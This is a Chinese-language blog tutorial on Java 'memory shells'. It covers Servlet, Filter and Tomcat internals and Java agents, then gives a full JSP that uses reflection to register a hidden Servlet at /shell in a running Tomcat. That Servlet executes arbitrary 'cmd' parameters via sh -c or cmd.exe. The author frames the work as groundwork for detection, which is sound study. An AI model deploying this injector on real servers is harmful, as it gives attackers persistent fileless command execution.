---
layout: post
title: 内存马原理
date: 2024-04-28 18:52 +0800
categories: [内存马] 
tags: [原理]
img_path: /img/memoryshell/
---

## 前言

随着检测技术不断的发展，传统的有文件型webshell越来越难以逃逸检测软件的查杀。而由于内存马具有着无文件落地、能够利用中间件的进程执行恶意代码、能驻留到内存当中等特点，逐渐受到了攻击人员的喜爱。本文将从头开始学习内存马，试图了解其原理以为后续的检测做准备。

接下来，在正式进入到内存马的学习前，我们首先要介绍一些基础知识！！！

（如文章有误，欢迎指出~）

## 一、基础知识

### 1、Java Web请求三大件

这里主要介绍一下，我们在内存马中常关注的有关于Java web的请求三件套：`listener、Filter、servlet`。根据各组件的请求特性，该三件套的启动顺序为：listener-> Filter-> servlet。下面我们将具体介绍一下这三个组件是什么。（参考来源：[一文了解内存马](https://blog.csdn.net/weixin_44604541/article/details/118673593)

![20210712143425109.png](1316b5314126c3303196e40df2373a78.png)

#### 1）Servlet

`Servlet`是运行在 Web 服务器或应用服务器上的程序，作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层，负责处理用户的请求，并根据请求安装服务端的业务逻辑生成相应的返回信息提供给用户。

> 补充：
>
> Web服务器：通俗来讲就是将某台主机的资源文件映射成URL供给外界访问。（比如访问某台电脑上的图片文件）
>
> Servlet容器：顾名思义就是存放Servlet对象的东西，Servlet主要作用是处理URL请求。（接受请求、处理请求、响应请求）
{: .prompt-tip}

如下图所示，`Servlet`容器对于url请求的处理过程如下：

1. HTTP客户端发起一个请求，若是第一次请求时，Servlet容器则调用HttpServlet的`init()`方法进行初始化；
2. Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象，并发送给对应的servlet实例；
3. Servlet程序进一步地调用service()方法，service()方法会根据请求类型进行调用对应的方法，例如：doGet(), doPost()等；（这些方法的内容是我们自定义的一些服务端业务逻辑）
4. 当请求处理完成后，会把响应结果给Servlet容器，然后由Servlet容器转发到客户端。
5. 当容器或者web服务器关闭时候，会调用destory方法进行销毁！

(下图的tomcat是Web应用服务器,是一个Servlet/JSP容器。Tomcat 作为Servlet容器,将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；同时会将响应的信息封装为HttpServletResponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器。）

![截图](9532d3f8e61b82624c7b9d7158f088c3.png)

`Servlet`容器的生命周期：（如上图所示）

1. 在web服务器刚启动时候（web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，会调用`init`方法读取`ServletConfig conf`去初始化servlet；
2. servlet程序会处理我们发起的所有请求，并利用方法在`service`方法执行；
3. 当程序关闭或web服务器关闭时候，会调用`destroy()`方法销毁servlet对象；
4. 最后由JVM进行回收。

#### 2）Filter

Filter（过滤器），最主要的作用在于对请求和响应数据进行拦截，并根据需求对数据包进行检查、修改等操作。（是一个实现了特殊接口的java类）

当我们在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它将可以决定数据是否进一步地传递给Servlet 程序，以及是否对数据进行修改等等操作。

基本的工作过程如下：

- 在数据传入的过程中，此时Servlet 容器就会调用某个 Servlet 程序进行处理；但此时，Servlet容器会首先检查我们是否已经注册了一个Filter 程序来对该 Servlet 进行拦截；若有，则容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法；
- 但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的
- 如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求；

因此，我们可以若我们能够在Filter.doFilter方法中调用 FilterChain.doFilter 方法的语句前后增加某些恶意代码，那么就可以在 Servlet 进行响应前后执行某些恶意操作了！

![截图](b4b1af8bd762f35aa8e399e680935cbb.png)

Filter的生命周期：

- 与Servlet一样，Filter的创建和销毁也由web容器负责。 web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）；
- Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。 

我们可以通过init方法的某些参数，来获得代表当前filter配置信息的FilterConfig对象，从而完成添加恶意filter的操作。

除此之外，由于我们可以同时设置多个filter存于内存中，因此web服务器将会根据Filter在web.xml文件中的注册顺序来组成一个filter链（也就是filterchain），然后将根据filterchain中的顺序进行过滤操作。故，为了确保我们注入的内存马一定会被执行，我们就需要将创建的恶意filter置于filterchain中的首位。

#### 3）Listener

Listener主要用于监听客户端请求、服务端操作等等，其是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。主要有以下几种lisntner：

- ServletContextListener：对Servlet上下文的创建和销毁进行监听
- ServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换
- HttpSessionListener：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效
- HttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听
- ServletRequestListener：对请求对象的初始化和销毁进行监听
- ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听

### 2、tomcat

接下来我们简要的介绍一下在tomcat与servlet的关系。（因为在后文的实验中我们会大量使用tomcat） --> Tomcat 是一个小型的轻量级应用服务器，它是一个servlet容器，是Apache的扩展，但它是独立运行的。 在tomcat中主要由四大容器组成，即：Engine、Host、Context、Wrapper；这四个容器之间是包含关系：

> Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。主要功能是：用来配置多个虚拟主机，每个虚拟主机都有一个域名当Engine获得一个请求时，它把该请求匹配到某个Host上，然后把该请求交给该Host来处理Engine有一个默认虚拟主机，当请求无法匹配到任何一个Host上的时候，将交给该默认Host来处理。 ==> 实现类org.apache.catalina.core.StandardEngine
>
> Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml。==> 实现类为 org.apache.catalina.core.StandardHost
>
> Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。 ==> 实现类为 org.apache.catalina.core.StandardContext
>
> Wrapper（包装器）：代表一个 Servlet程序，它负责管理一个 Servlet程序，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。 ==> 实现类为 org.apache.catalina.core.StandardWrapper

![1586953-20210526231459874-689204273.png](0f0247ded63538cf8d3cc67a2c2dd16a.png)

![79effdcb49b09cfa22404a219701561b.png](eec51c52a687452d3dcfb5bd291428cf.png)

上图参考自：[angry_program师傅的博客](https://blog.csdn.net/angry_program/article/details/118492214)。除此之外，Container容器则是负责封装和管理Servlet处理用户的Servlet请求，并返回对象给web用户的模块（也就是servlet容器）。上图也表示了主要的子继承容器关系为（wrapper是没有addChild的 ） 

### 3、Spring MVC

这里简要的介绍一下在后续注入spring框架时会涉及到的一些基础知识。

#### 1）Bean

bean 是 Spring 框架的一个核心概念，它是构成应用程序的主干，并且是由 Spring IoC 容器负责实例化、配置、组装和管理的对象。简单来讲：

Bean \=\=>  是一个对象 \=\=> 被 Spring IoC 进行管理 \=\=> spring框架的主题是由一个个bean构成的！

#### 2）ApplicationContext

在Spring 框架中，BeanFactory 接口是 Spring IoC容器 的实际代表者 \=\=> 而ApplicationContext 接口则进一步地继承了 BeanFactory 接口。如下图（参考来自[奇安信观星实验室](https://www.anquanke.com/post/id/198886) )，说明了ApplicationContext 的承接关系，其还继承了其他接口以扩充自身的功能：

![t01452143b87b518333.png](dd3200077c24b8da5a3b6516b76d7c35.png)

综上，我们可以知道`org.springframework.context.ApplicationContext`接口也可以间接的代表IoC容器，负责后续的实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖等功能。因此，在我们进行注入的时候获取到ApplicationContext是比较重要的一步。

#### 3） Root Context 和 Child Context 

在spring应用中是可以同时存在多个context的，但是其中只能一一个root context，其余都为child context。

而child context以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean。在我们这些Context创建后，都会被作为一个属性添加到了 ServletContext中。

#### 4）ContextLoaderListener

`ContextLoaderListener`主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean。

#### 5）DispatcherServlet

DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。

> Controller层：控制层 控制业务逻辑；具体的业务模块流程的控制，controller层主要调用Service层里面的接口控制具体的业务流程，控制的配置也要在配置文件中进行。
>
> view层：此层与控制层结合比较紧密，需要二者结合起来协同工发。View层主要负责前台jsp页面的表示

从本质上来说，DispatcherServlet 从本质上来讲是一个 Servlet（扩展了 HttpServlet )。

总的来说：每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。

### 4、Java反射

反射就是把java类中的各种成分映射成一个个的Java对象。其主要过程是：

1. 获取目标类型的class对象；
2. 通过 Class 对象分别获取Constructor类对象、Method类对象 & Field 类对象；
3. 通过 Constructor类对象、Method类对象 & Field类对象分别获取类的构造函数、方法&属性的具体信息，并进行后续操作。

![截图](5fe93f665c8b2ac17c4050b11ae8c1d8.png)

### 5、Java agent

在 jdk 1.5 之后引入了 java.lang.instrument 包，Instrumentation包是Java提供的一个来自JVM的接口，提供了一系列查看和操作Java类定义的方法，能够检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题。

而 Java Agent则是一种特殊的Java程序（Jar文件），是Instrumentation的客户端。Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法，向classLoader的classpath下加入jar文件等。Java agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中。Java agent的加载入口点是 premain 和 agentmain 等两种。

- 实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）
- 实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）

#### premain方法-启动时加载 agent

![1651476536_626f8838ad36e09b05e7f.jpg](aa1df84777d5f43aaeac60e7eae7ff63.jpg)

我们首先实现 `premain `方法，除此之外我们 `jar `文件的清单（mainfest）中必须要含有Premain-Class属性。然后我们可在命令行利用 -javaagent 来实现启动时加载。
`premain`会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 `Premain-Class `类中的 `premain `方法。接下来我们简要的写一个`premain`方法的demo：

```java
import java.lang.instrument.Instrumentation;

public class DemoTest {
    // 启动时加载
    public static void premain(String agentArgs, Instrumentation inst) throws Exception{
        System.out.println(agentArgs);
        System.out.println("DemoTest Agent is running.");
    }
}
```

接下来创建`mainfest`，即`agent.mf `（注意一定要包含`Premain-Class `属性)

```java
Manifest-Version: 1.0
Premain-Class: DemoTest

```

然后编译我们的java文件为class文件：

```
javac DemoTest.java
```

利用 jar 命令打包，生成我们的 `agent.jar`：

```
jar cvfm agent.jar agent.mf DemoTest.class
```

进一步地，我们继续创建一个普通的类作为测试是否是启动时先加载`premain`：

```java
public class Hello {
    public static void main(String[] args) {
        System.out.println("Hello,Java");
    }
}
```

hello.mf：

```java
Manifest-Version: 1.0
Main-Class: Hello

```

同我们的agent一样进行打包：

```
jar cvfm hello.jar hello.mf Hello.class
```

最终的文件清单：
![截图](fcacfe544c9251f78bc56e2c1bb8d8c2.png)

接下来，我们进行测试。（需要添加 -javaagent:agent.jar  即可在启动时优先加载 agent ）

```
java -javaagent:agent.jar[=options] Hello
```

![截图](e3cb8d99918ef0f467d228f6851351af.png)

这里可以看到我们 agent 中 premain 的代码被优先执行了，同时还获取 到了 agentArgs 参数！！

#### 动态修改字节码Demo

首先利用 `addTransformer` 注册一个 `transformer` ，然后创建一个 `ClassFileTransformer` 抽象类的实现类，然后 `override transform `方法：

```java
import java.lang.instrument.Instrumentation;

public class DemoTest {
    // 启动时加载
    public static void premain(String agentArgs, Instrumentation inst) throws Exception{
        System.out.println(agentArgs);
        System.out.println("DemoTest Agent is running.");
        // 注册 DefineTransformer 
        inst.addTransformer(new DefineTransformer(),true);
    }
}
```

然后我们继续创建一个`DefineTransformer.java`，这个程序我们可以在其中加入自定义的逻辑：

```java
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

// 每当类被加载，就会调用 transform 函数
public class DefineTransformer implements ClassFileTransformer {
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println("Transforming " + className);
        return new byte[0];
    }
}
```

注意：如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 `MANIFEST.MF `中添加 `Can-Retransform-Classes: true` 或` Can-Redefine-Classes: true`

修改`agent.mf`：

```java
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Premain-Class: DemoTest

```

然后重新打包：

```
javac DemoTest.java
jar cvfm agent.jar agent.mf DemoTest.class
```

然后运行：

此时，当类被加载的时候就会调用 `DefineTransformer` 中的 `transform `方法，然后我们这里的逻辑就是直接输出加载的类的类名:
![截图](4494c71e0c349ca34b0a3feb9a83395a.png)

#### agentmain方法-启动后加载Demo

![1651476575_626f885f9635066acb126.jpg](81589561449c43cbe3adf475779165ce.jpg)

要求和之前类似，我们需要满足以下条件
必须要实现 agentmain 方法
Jar 文件清单中必须要含有 Premain-Class 属性这里，我们利用IDEA进行测试：
新建项目：
![截图](7f7577cdb4ddab5275bf102883a90e32.png)

点击`project structure`中的`Libraries`添加`tool.jar`
![截图](668bf1c2bbbccdfeea18f7faaee2957f.png)

然后接下来，我们编写demo：

编写 AgentMain.java：

```java
import java.lang.instrument.Instrumentation;

public class AgentMain {
    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
    }
}
```

编写 DefineTransformer.java：

```java
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer {
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println(className);
        return classfileBuffer;
    }
}
```

编写agentmain.mf：

```
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: AgentMain

```

然后编译成class并打包：

```
jar cvfm AgentMain.jar agentmain.mf AgentMain.class DefineTransformer.class
```

然后，进一步的我们写AgentMainDemo 文件：

```
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;

public class AgentMainDemo {
    public static void main(String[] args) throws Exception{
        String path = "D:\\07-Enviroment\\web\\内存马测试环境\\java\\test-demo\\src\\AgentMain.jar";
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor v:list){
            System.out.println(v.displayName());
            if (v.displayName().contains("AgentMainDemo")){
                // 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接
                VirtualMachine vm = VirtualMachine.attach(v.id());
                System.out.println("id>>>" + v.id());
                // 将我们的 agent.jar 发送给虚拟机 
                vm.loadAgent(path);
                vm.detach();
            }
        }
    }
}
```

最终效果如下：
![截图](bc3ebe2cdaed5a27acef67d93a8d5948.png)

或者使用这个TestAgentMain：

```java
public class TestAgentMain {

    public static void main(String[] args) {
        try{
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            System.out.println(toolsPath.toURI().toURL());
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List<Object> list = (java.util.List<Object>) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM Start..");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                String name = (String) displayName.invoke(o,null);
                System.out.println(name);
                if (name.contains("TestAgentMain")){
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    java.lang.String path = "D:\\07-Enviroment\\web\\AgentMain.jar";
                    loadAgent.invoke(vm,new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

![截图](520cab06a9cb5e24a0339c4de178af66.png)

<br/>

但在实际环境中通常都是已经启动了JVM因此，我们只能利用agentmain方法进行后续的注入，我们可以利用java Instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码。

## 二、内存马原理与实现

环境靶场的搭建可以参考另一篇博客上一篇博客！

### 1、Servlet类型

根据`Servlet`的生命周期可知，一旦其启动，则只会在重载或者web服务关闭时才会销毁，其余时间会一直驻留在内存当中！

Servlet接口类有五个接口，分别是init（Servlet对象初始化时调用）、getServletConfig（获取web.xml中Servlet对应的init-param属性）、service（每次处理新的请求时调用，会进一步的调用doget和dopost）、getServletInfo（返回Servlet的配置信息，可自定义实现）、destroy（结束时调用）。

因此，我们可以动态的创建一个恶意的`Servlet`容器，并在对应的`service`中写入恶意执行代码，那么我们就可以实现我们所需的代码注入了！

#### （1） Servlet Demo

接下来，我们自己写一个Servlet实现类ServletDemo，主要实现service方法中的doGet：（具体的配置过程可以参考我的java web运行调试篇）

```java
import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;
// 扩展 HttpServlet 类
public class DemoServlet extends HttpServlet {

    private String message;

    public void init() throws ServletException
    {
        System.out.println("Servlet启动...");
        // 执行必需的初始化
        message = "Hello World";
    }

    public void doGet(HttpServletRequest request,
                      HttpServletResponse response)
            throws ServletException, IOException
    {
        // 设置响应内容类型
        response.setContentType("text/html");

        // 实际的逻辑是在这里
        String cmd = request.getParameter("cmd");
        PrintWriter out = response.getWriter();
        out.println("<h1>" + message + "</h1>"+"你的输出在这里"+cmd);
    }

    public void destroy()
    {
        System.out.println("关闭");
        // 什么也不做
    }
}

//运行命令：javac -encoding UTF-8 -classpath ".;.\tomact\apache-tomcat-9.0.68\lib\servlet-api.jar" DemoServlet.java

```

然后配置`WEB-INF`之下的`web.xml`：（有了配置文件，web才能找到对应的class进行启动。这在注入内存马中很重要）

```xml
    <servlet>
        <servlet-name>demoServlet</servlet-name>
        <servlet-class>DemoServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>demoServlet</servlet-name>
        <url-pattern>/demo</url-pattern>
    </servlet-mapping>

```

然后，我们启动看看：

![截图](4dccc328174cf68cea4abf090ea41e02.png)

![截图](5211fda76a99c686e03d3737ef1c0c5c.png)

这里我就展示了一个可以传入参数的地方，也就是我们的`cmd`参数，因此若我们能够在此处构造一些恶意的命令执行的操作的话，就可以实现我们所需的webshell功能了！ 除此之外，我们可以看出`Servlet`的生命周期开始于`Web`容器的启动时（解析加载`web.xml`配置的`servlet`对象），它就会被载入到`Web`容器内存中，直到`Web`容器停止运行或者重新装入`servlet`时候结束。

然后，进一步的我们设置断点看看整个过程的变化：（查看 `StandardContext`的`children`下包含的`StandardWrapper`信息）

![截图](812acb275faedc54c978dd995c5dde8c.png)

![截图](f9a03e312bf5b660b56e56b9e0e1ea25.png)

通过上图，我们可以清楚的看到我们的`Servlet`的整个装载过程。就如前文的图一样：首先启用container进行包装 \=\=\> `StandardEnginer'` 开启引擎示例 =\=\> `StandardHost` 记录IP=\=\> `StandardContext`加载配置（Web应用），添加`Servlet`到`Children`中 =\=\> `StandardWrapper` 封装`Servlet`。

在`StandardContext`有对应的`servletMappings`，记录了`url信息`跟所对应的`servlet`的关系:

![截图](ac9a8c0618ea791bf263a4536f3c82cd.png)

而`StandardWrapper`中则会进一步的对应配置文件中的如下节点：

```xml
        <servlet-name>demoServlet</servlet-name>
        <servlet-class>DemoServlet</servlet-class>
```

![截图](c0bb3af451145d0df37470aab3391b79.png)

因此，我们的内存马仔动态的注入过程中最主要关心的就是 `StandardContext`以及 `StandardWrapper`。接下来，我们将具体的分析一下内存马的注入。

#### （2）内存马

根据`Servlet`的生命周期，我们可以知道当我们的容器启动之时，会通过解析加载的`web.xml`来配置对应的`servle`t对象，而后就会进一步的载入到容器的内存当中，直至`Web容器`的终止或者`Servlet`的重载。因此，一般情况下当前`Servlet`被载入到`Web`容器之后，就会长久的置于内存当中。我们要想完成对`Servlet`的注入，只能动态的添加 ==>  在Tomcat7之后的版本中，`StandardContext`类中提供了动态添加`Servlet`类的方法：利用`addServlet`。

根据前一节所述，我们在注入内存马的过程中主要会经历以下几个过程：

- 创建一个新的恶意的`Servlet`；
- 获取当前的`StandardContext`	；
- 将创建的恶意`Servlet`封装成`StandardWrapper`并添加到`StandardContext`的`children`当中；
- 进一步的继续添加`ServletMapping`	并将访问的`URL`和`wrapper`进行绑定。

**第一步：**创建一个新的恶意的`Servlet`

直接在demo的模板上进行修改，并在service中加入我们的命令执行操作！

```jsp
<%
    // 创建恶意Servlet
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd"); // 获取参数cmd的值
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name"); //判断系统是linux还是Windows
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {  
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};//调用命令行交互页面
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); //执行
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {

        }
    };

    %>
```

根据`Servlet`的五个接口类，我们只需要在`service`中加入命令行执行的动作，即可！！！

**第二步：**获取当前的`StandardContext`

```jsp
<%
    // 获取StandardContext
    ServletContext ctx = request.getSession().getServletContext(); // 获取ServletContext对象，它代表当前Web应用的上下文环境
    Field f = ctx.getClass().getDeclaredField("context"); // 通过反射获取ServletContext实例的"context"字段。
    f.setAccessible(true); // 设置访问权限，允许访问私有字段
    ApplicationContext appCtx = (ApplicationContext)f.get(ctx); // 获取实际的ApplicationContext对象

    f = appCtx.getClass().getDeclaredField("context"); //使用反射，从ApplicationContext对象中获取"context"字段，
    f.setAccessible(true); // 设置访问权限
    StandardContext standardCtx = (StandardContext)f.get(appCtx); // 获取StandardContext对象
%>
```

根据之前的知识可以知道：`Context` 负责管理 `Wapper`，而 `Wapper` 又负责管理` Servlet` 实例。因此，我们这一步获取`StandardContext`对象后，就可以用`createWapper() `来生成一个` Wapper `对象。

**第三步：**将创建的恶意`Servlet`封装成`StandardWrapper`并添加到`StandardContext`的`children`当中；

```jsp
<%
   // 用Wrapper对其进行封装
    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper(); //从StandardContext.createWapper()获得一个Wapper对象
    newWrapper.setName("jweny");  //设置Servlet的名字
    newWrapper.setLoadOnStartup(1); // 设置启动级
    newWrapper.setServlet(servlet); // 配置Servlet的Class
    newWrapper.setServletClass(servlet.getClass().getName());

    // 添加封装后的恶意Wrapper到StandardContext的children当中
    standardCtx.addChild(newWrapper);
    %>
```

**第四步：**添加`ServletMapping`    并将访问的`URL`和`wrapper`进行绑定

```jsp
<%
  // 添加ServletMapping将访问的URL和Servlet进行绑定
    standardCtx.addServletMapping("/shell","jweny");
%>
```

此处的意思是，我们只要访问当前应用的`/shell`即可出发该内存马！（注意这里需要在我们的环境中放开shell的访问权限）

全部的jsp内容：

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.IOException"%>
<%@ page import="javax.servlet.DispatcherType"%>
<%@ page import="javax.servlet.Filter"%>
<%@ page import="javax.servlet.FilterChain"%>
<%@ page import="javax.servlet.FilterConfig"%>
<%@ page import="javax.servlet.FilterRegistration"%>
<%@ page import="javax.servlet.ServletContext"%>
<%@ page import="javax.servlet.ServletException"%>
<%@ page import="javax.servlet.ServletRequest"%>
<%@ page import="javax.servlet.ServletResponse"%>
<%@ page import="javax.servlet.annotation.WebServlet"%>
<%@ page import="javax.servlet.http.HttpServlet"%>
<%@ page import="javax.servlet.http.HttpServletRequest"%>
<%@ page import="javax.servlet.http.HttpServletResponse"%>
<%@ page import="org.apache.catalina.core.ApplicationContext"%>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig"%>
<%@ page import="org.apache.catalina.core.StandardContext"%>
<%@ page import="org.apache.tomcat.util.descriptor.web.*"%>
<%@ page import="org.apache.catalina.Context"%>
<%@ page import="java.lang.reflect.*"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.util.Map"%>

<%!
    // 创建恶意Servlet
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {

        }
    };

%>
<%
    // 获取StandardContext
    ServletContext ctx = request.getSession().getServletContext();
    Field f = ctx.getClass().getDeclaredField("context");
    f.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext)f.get(ctx);

    f = appCtx.getClass().getDeclaredField("context");
    f.setAccessible(true);
    StandardContext standardCtx = (StandardContext)f.get(appCtx);
    System.out.println(standardCtx);

    // 用Wrapper对其进行封装
    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
    newWrapper.setName("jweny");
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());

    // 添加封装后的恶意Wrapper到StandardContext的children当中
    standardCtx.addChild(newWrapper);

    // 添加ServletMapping将访问的URL和Servlet进行绑定
    standardCtx.addServletMappingDecoded("/shell","jweny");

%>
```

然后，上传测试：

![截图](4e8b3dfca3652fbfb82a0728b9a66f18.png)

![截图](cb620591f46a9841bde89382d11a348f.png)

![截图](14a615eb64cf35f75f6244eb5edf9462.png)

### 2、Filter型

类似的，我们简化前面有关于Filter的类型：
![截图](36e941bfeb39b976d12345b901fb1aba.png)

根据此图，我们可以了解到当我们客户端发起请求时候，会首先经过一系列`filter`然后到达我们的`Servlet`容器。那么设想，如果我们可以动态的创建一个恶意的`filter`并置于`filterchains`的最前端，那么此时传入的任何数据都会经由我们的恶意`filter`最先执行！

#### （1）filter demo

这里，我们继续进一步的写一个DemoFilter：

```java
package com.yuan;

import javax.servlet.*;
import java.io.IOException;

public class filterDemo implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter初始....");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        System.out.println("拦截并进行过滤操作......");
        // 放行
        chain.doFilter(request, response);  //调用filterchain中的dofilter来激活Servlet中的service方法
    }
    @Override
    public void destroy() {
    }
}
```
